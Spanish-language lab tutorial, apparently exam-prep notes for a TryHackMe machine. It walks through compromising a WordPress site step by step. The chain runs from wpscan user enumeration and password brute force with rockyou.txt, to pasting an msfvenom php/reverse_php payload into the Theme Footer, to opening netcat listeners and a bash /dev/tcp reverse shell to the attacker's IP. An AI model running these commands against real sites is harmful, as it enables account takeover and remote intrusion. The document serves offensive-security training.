
---
- TAG: #Auditoría #Seguridad #WordPress 
---

## Parte 2: Uso de `wp-scan` para Enumeración y Ataques de Fuerza Bruta en WordPress

En esta sección, como les había mencionado, vamos a hacer uso de la herramienta `wp-scan`, ya que queremos encontrar usuarios válidos primero y luego realizar un ataque de fuerza bruta para podernos loguear.

### 1. Enumeración de Usuarios y Plugins Vulnerables

Nos dirigimos a nuestra terminal y ejecutamos:

```bash
wpscan --url http://1.2.3.4/blog --enumerate u,vp
```

**Nota:** Al poner la ruta dentro de `wp-scan`, no incluyan `wp-login`, solo la URL base.

- La opción `u` nos permite enumerar a los usuarios.
- La opción `vp` es para encontrar plugins vulnerables.

Una vez terminado el escaneo, veremos que hemos encontrado el usuario `admin` y que no se han detectado plugins vulnerables.

### 2. Ataque de Fuerza Bruta

Ahora, necesitamos encontrar la contraseña mediante fuerza bruta. En clases anteriores vimos cómo realizarlo con `hydra`, pero esta vez utilizaremos `wpscan`, que es más eficiente para entornos WordPress ya que está específicamente diseñada para atacar WordPress.

Ejecutamos un comando similar al anterior, pero esta vez buscamos contraseñas para el usuario:

- `--passwords` nos permite asignar el diccionario para el ataque de fuerza bruta.
- `--usernames` nos permite especificar el usuario encontrado al cual queremos descifrar la contraseña.

```bash
wpscan --url http://1.2.3.4/blog --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

Esperamos unos segundos y veremos un resultado similar a este:

```python
[!] Valid Combinations Found:
 | Username: admin, Password: my2boys
```

Nos logueamos en la página de login, seleccionamos la opción "recordar" y entramos al panel interno de WordPress.

### 3. Inyección de Código Malicioso

En el examen les pedirán realizar algo similar. Una vez que estén dentro del panel, necesitarán acceder a la máquina. Nuestro objetivo en este punto será subir un código malicioso dentro de WordPress. Esto se puede hacer editando una plantilla o página web dentro de WordPress para añadir un código malicioso en `.php`. Como en el examen no tendremos acceso a internet, aquí tenemos dos opciones:

1. Crear archivos maliciosos con `msfvenom`.
2. Editar directamente los archivos en WordPress.

Debemos dirigirnos al apartado `appearance`. Si vemos un panel que dice `upload-file`, es mejor ir allí, pero si no, vamos directamente a `appearance` > `Theme editor`.

Aquí, nuestra intención es inyectar un código malicioso en `.php` para obtener ejecución remota de comandos. Al lado derecho, veremos diferentes plantillas; recomiendo buscar el apartado llamado `Theme Footer`, que corresponde al pie de página principal en WordPress.

Si al abrir el archivo aparece código, bórrenlo todo hasta dejar la página vacía. Luego, pegamos el payload creado con `msfvenom`. Aunque no nos permite subir el archivo `.php`, sí podemos copiar y pegar el contenido en el apartado de `Theme Footer`.

### 4. Creación y Ejecución del Payload

1. Creamos un archivo malicioso `.php` con el siguiente comando:

    ```bash
    msfvenom -p php/reverse_php LHOST=1.2.3.4 LPORT=443 -f raw > pwned.php
    ```

    **Nota:** Especificamos la IP de nuestra máquina atacante y el puerto por donde vamos a estar en escucha.

2. Una vez creado el archivo, ejecutamos `cat` para visualizar su contenido:

    ```bash
    cat pwned.php
    ```

    Luego, copiamos el contenido y lo pegamos en el apartado de `Theme Footer`, y guardamos los cambios.

3. Nos ponemos a la escucha con netcat en el puerto 443:

    ```bash
    nc -nlvp 443
    ```

4. Ahora, nos dirigimos a la página principal del blog (`http://1.2.3.4/blog`). Recuerden que el `Footer` es la página principal en WordPress. Al recargar la página, regresamos a nuestra terminal y veremos que hemos ganado acceso remoto a la máquina víctima.

### 5. Establecer una Nueva Conexión

Recuerden que es importante establecer una nueva conexión para no perder acceso. Nos ponemos a la escucha por el puerto 444:

```bash
nc -nlvp 444
```

Luego, desde la conexión en el puerto 443, creamos una nueva sesión utilizando `revshells.com`:

```bash
bash -c "sh -i >& /dev/tcp/1.2.3.4/444 0>&1"
```

**Importante:** En este comando, reemplacen la dirección IP por la que les otorga la VPN de **TryHackMe**. Si no reciben la conexión, intenten cerrar todos los procesos revisando con `lsof -i :(puerto)` y terminándolos con `kill -9 ID`. Si siguen teniendo problemas, intenten recibir la sesión en otro puerto. ¡Estas cosas pasan!

---


